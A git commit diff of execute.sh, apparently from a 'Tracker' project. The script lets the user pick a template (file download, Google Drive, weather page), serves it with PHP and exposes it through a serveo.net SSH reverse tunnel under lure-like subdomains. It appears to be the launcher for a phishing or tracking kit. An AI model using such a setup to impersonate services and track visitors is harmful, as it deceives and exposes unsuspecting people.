8bb3ffc3bf42617f8a592a16cba6e1b45cdd1632
lifeofsoumya <mondalsoumya2001@gmail.com>
2022-01-13 12:34:36 +0530

    execute.sh in progress

--- execute.sh
+++ execute.sh
@@ -1,3 +1,48 @@
-cd /Tracker
-php -S 127.0.0.1:8000
-ssh -R weatherfindersite:80:127.0.0.1:8000 serveo.net
+echo "Choose the Template:"
+echo "1. File Download"
+echo "2. Google Drive"
+echo "3. Weather Page"
+
+read -p "Enter Template Number: " tempno
+
+
+filedownload(){
+
+    echo "Starting PHP Server"
+    cd /Tracker/filedownload
+    php -S 127.0.0.1:8000
+    echo "Starting serveo"
+    ssh -R filedownloadersitex:80:127.0.0.1:8000 serveo.net
+    
+}
+
+gdrive(){
+
+    echo "Starting PHP Server"
+    cd /Tracker/gdrive
+    php -S 127.0.0.1:8000
+    echo "Starting serveo"
+    ssh -R googledrivedownloaderx:80:127.0.0.1:8000 serveo.net
+    
+}
+
+weather(){
+
+    echo "Starting PHP Server"
+    cd /Tracker/weather
+    php -S 127.0.0.1:8000
+    echo "Starting serveo"
+    ssh -R weatherfindersitex:80:127.0.0.1:8000 serveo.net
+    
+}
+
+
+if [ $tempno == 1 ]
+then
+    filedownload
+elif [ $tempno == 2 ]
+then 
+    gdrive
+else
+    weather
+fi
